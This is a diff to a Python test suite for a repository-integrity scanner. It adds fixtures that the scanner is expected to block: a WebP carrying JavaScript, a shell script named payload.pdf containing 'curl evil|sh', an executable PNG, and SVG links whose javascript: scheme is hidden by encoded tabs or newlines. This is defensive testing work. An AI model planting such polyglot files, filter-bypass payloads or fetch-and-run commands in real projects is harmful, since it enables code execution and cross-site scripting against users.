@@ -44,10 +44,30 @@ def gif_blob() -> bytes:
 
 
 def webp_blob() -> bytes:
-    """A minimal RIFF/WEBP container whose declared length matches exactly."""
-    payload = bytes(16)
+    """A minimal RIFF/WEBP container: declared length exact, real VP8 keyframe
+    start code in the payload."""
+    payload = b"\x00\x00\x00" + b"\x9d\x01\x2a" + bytes(10)
     body = b"WEBP" + b"VP8 " + len(payload).to_bytes(4, "little") + payload
     return b"RIFF" + len(body).to_bytes(4, "little") + body
+
+
+def script_webp_blob() -> bytes:
+    """Honest RIFF and chunk lengths, JavaScript in the image payload."""
+    payload = b'*/=0;console.log("EXEC")/*' + b"A" * 40 + b"*/"
+    body = b"WEBP" + b"VP8 " + len(payload).to_bytes(4, "little") + payload
+    return b"RIFF" + len(body).to_bytes(4, "little") + body
+
+
+def png_blob() -> bytes:
+    return b"\x89PNG\r\n\x1a\n" + (13).to_bytes(4, "big") + b"IHDR" + bytes(20)
+
+
+def pdf_blob() -> bytes:
+    return b"%PDF-1.7\n" + bytes(24) + b"\ntrailer\n%%EOF\n"
+
+
+def ico_blob() -> bytes:
+    return b"\x00\x00\x01\x00\x01\x00" + bytes(16) + bytes(32)
 
 
 def woff2_blob(num_tables: int = 1) -> bytes:
@@ -172,6 +192,44 @@ class RepositoryIntegrityTest(unittest.TestCase):
         (self.repo / "assets").mkdir()
         (self.repo / "assets" / "ok.gif").write_bytes(gif_blob())
         (self.repo / "assets" / "ok.webp").write_bytes(webp_blob())
+        findings = self.scan(self.commit())
+        self.assertEqual(findings, [])
+
+    def test_webp_with_honest_lengths_but_script_payload_is_blocked(self) -> None:
+        """Self-consistent chunk lengths are not proof of an image."""
+        path = self.repo / "assets" / "sizes.webp"
+        path.parent.mkdir()
+        path.write_bytes(script_webp_blob())
+        findings = self.scan(self.commit())
+        self.assertTrue(any("sizes.webp" in f.path for f in findings))
+
+    def test_valid_pdf_and_ico_pass(self) -> None:
+        (self.repo / "docs").mkdir()
+        (self.repo / "docs" / "ok.pdf").write_bytes(pdf_blob())
+        (self.repo / "docs" / "ok.ico").write_bytes(ico_blob())
+        findings = self.scan(self.commit())
+        self.assertEqual(findings, [])
+
+    def test_shell_script_named_pdf_is_blocked(self) -> None:
+        path = self.repo / "docs" / "payload.pdf"
+        path.parent.mkdir()
+        path.write_text("#!/bin/sh\ncurl evil|sh\n", encoding="utf-8")
+        findings = self.scan(self.commit())
+        self.assertTrue(any("payload.pdf" in f.path for f in findings))
+
+    def test_executable_asset_is_blocked(self) -> None:
+        """The executable bit runs a payload without any invocation in text."""
+        path = self.repo / "assets" / "run.png"
+        path.parent.mkdir()
+        path.write_bytes(png_blob())
+        os.chmod(path, 0o755)
+        findings = self.scan(self.commit())
+        self.assertTrue(any("executable bit" in f.reason for f in findings))
+
+    def test_ordinary_asset_mode_passes(self) -> None:
+        path = self.repo / "assets" / "plain.png"
+        path.parent.mkdir()
+        path.write_bytes(png_blob())
         findings = self.scan(self.commit())
         self.assertEqual(findings, [])
 
@@ -337,6 +395,42 @@ class RepositoryIntegrityTest(unittest.TestCase):
         )
         findings = self.scan(self.commit())
         self.assertTrue(any("SVG contains active" in f.reason for f in findings))
+
+    def test_tab_encoded_javascript_scheme_is_blocked(self) -> None:
+        """URL parsing discards embedded tabs before resolving the scheme."""
+        path = self.repo / "assets" / "tab.svg"
+        path.parent.mkdir()
+        path.write_text(
+            '<svg xmlns="http://www.w3.org/2000/svg">'
+            '<a href="java&#x09;script:alert(1)"><rect width="1" height="1"/></a></svg>',
+            encoding="utf-8",
+        )
+        findings = self.scan(self.commit())
+        self.assertTrue(any("SVG contains active" in f.reason for f in findings))
+
+    def test_newline_encoded_javascript_scheme_is_blocked(self) -> None:
+        path = self.repo / "assets" / "nl.svg"
+        path.parent.mkdir()
+        path.write_text(
+            '<svg xmlns="http://www.w3.org/2000/svg">'
+            '<a href="java&#x0a;script:alert(1)"><rect width="1" height="1"/></a></svg>',
+            encoding="utf-8",
+        )
+        findings = self.scan(self.commit())
+        self.assertTrue(any("SVG contains active" in f.reason for f in findings))
+
+    def test_svg_text_split_across_lines_is_not_flagged(self) -> None:
+        """Control stripping must not join unrelated tokens into a false match."""
+        path = self.repo / "assets" / "split.svg"
+        path.parent.mkdir()
+        path.write_text(
+            '<svg xmlns="http://www.w3.org/2000/svg">\n'
+            '<desc>java</desc>\n<desc>script: release notes</desc>\n'
+            '<rect width="1" height="1"/></svg>',
+            encoding="utf-8",
+        )
+        findings = self.scan(self.commit())
+        self.assertEqual(findings, [])
 
     def test_svg_with_harmless_entities_passes(self) -> None:
         """Decoding must not turn ordinary escaped text into a false positive."""
